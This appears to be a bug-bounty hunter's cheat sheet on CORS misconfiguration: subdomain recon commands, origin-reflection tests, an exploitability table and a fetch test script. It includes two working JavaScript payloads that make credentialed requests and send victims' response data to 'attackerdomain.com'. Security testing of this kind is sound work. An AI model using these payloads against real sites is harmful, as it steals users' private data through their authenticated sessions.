  CORS  BYpassing / Misconfigured
  
  hunting 1 (single target)
  
  Step->1. Capture the target website and spider or crawl all the website using burp.
 Step->2. Use burp search look for Access-Control
 Step->3. Try to add Origin Header i.e,Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com
 Step->4  If origin is reflected in response means the target is vuln to CORS
 
 hunting 2 (muitple target)
 step 1-> find domains i.e subfinder -d target.com -o domains.txt
 step 2-> check alive ones : cat domains.txt | httpx | tee -a alive.txt
 step 3-> send each alive domain into burp i.e, cat alive.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
 step 4-> Repeat hunting method 1
 
   (1) Automate Way 
    step1-> find domains i.e, subfinder -d domain.com -o target.txt
  step2-> grep alive: cat target.txt | httpx | tee -a alive.txt
  step3-> grep all urls using waybackurls by @tomnomnom and gau tool i.e,cat alive.txt | gau | tee -a urls.txt
  step4-> run any of these tools on each url 
  step5-> configure the manually

    automation 2 
    1) Find Domains with the help of subfinder,assetfinder,findomain i.e , subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1 .
  2) Then cat hosts1 | sort -u | tee -a hosts2 and then cat hosts2 | httpx | tee -a hosts .
   3) Navigate through terminal where hosts file is located  echo "/" > paths
   4) Then type meg -v
  5) After the completion of process type gf cors.
  6) All the urls with Access-Control-Allow will be displayed.

  tip
  💡
  A server may (at times) respond with CORS headers ONLY if the Origin header is set in the request. If this Origin header is not there already then try adding it.
  
  GET
  var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://target.example.com/endpoint/',true); 
xhr.withCredentials = true;
xhr.send();

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  POST
  var postdata = "fname=Henry&lname=Ford"

var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open("POST", 'https://target.example.com/endpoint/', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send(postdata);

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  
  
  
   \\HOW TO IDENTIFY A WEBSITE THAT IS VUNERABLE TO CORS MISCONIFIGATION  //
 1)CHECK RESPONSE HEADERS: 
 Examine the HTTP response headers of the website. Look for the presence of CORS-related headers. 
  
  \\ KEY HEADER TO CHECK //
Access-Control-Allow-Origin: This header specifies which origins are permitted to access the resources on the website. If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability. no browers acceo]pt using only wild card *
    NOTE ON THIS
   When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
In other words, using a wildcard effectively disables the Allow-Credentials header.

As a result of these limitations, many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.




Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
Access-Control-Allow-Credentials: If this is set to true, it means that the website allows credentials (e.g., cookies) to be included in cross-origin requests. This should be used cautiously.


   the following table summarizes the exploitability based on the CORS configuration:
   
   acces control-Allow-Origin” value          Access-Control-Allow-Credentials” value                 Exploitable
   https://attacker.com                                true                                                     yes
     null                                                true                                                  yes
     *                                                  true                                                    no

curl https://my.target.com/api/web/user -H "Origin: https://geekboy.ninja" -I 


  
    STEP BY STEP USING THE DEVELOPER BROWERS TOOL
    
    OPEN THE browers and go to the website , go to the developer tool when right click 
    check on the netwrok tab/ console
    
    go to different website and copy its url , open the developer tools and 
    type a command to make a request to the first website (the testing websites)
    OBSERVE THE RESULT
    
   After you send the request, check what happens in the developer tools. If everything is set up correctly (good CORS), the request might be blocked, and you'll see an error message. 
 
   But if the request goes through without any problems (bad CORS), 

    always Repeat and Experiment:

  Try different websites and different types of requests (GET, PUT, PATCH, POST, DELETE,OPTION AND HEAD ).
  

    Javascript Script For Testing Cors
    
    // Replace these with your target website and the origin you want to test.
const targetURL = 'https://example.com';
const customOrigin = 'https://attacker.com';

// Create a fetch request with a custom origin header.
fetch(targetURL, {
  method: 'GET', // You can use different methods like POST, PUT, DELETE, etc.
  headers: {
    'Origin': customOrigin,
  },
})
  .then(response => {
    console.log('Response status:', response.status);
    // Check if the response headers indicate that the request was allowed.
    if (response.headers.get('Access-Control-Allow-Origin') === customOrigin) {
      console.log('CORS is potentially misconfigured.');
    } else {
      console.log('CORS is properly configured.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
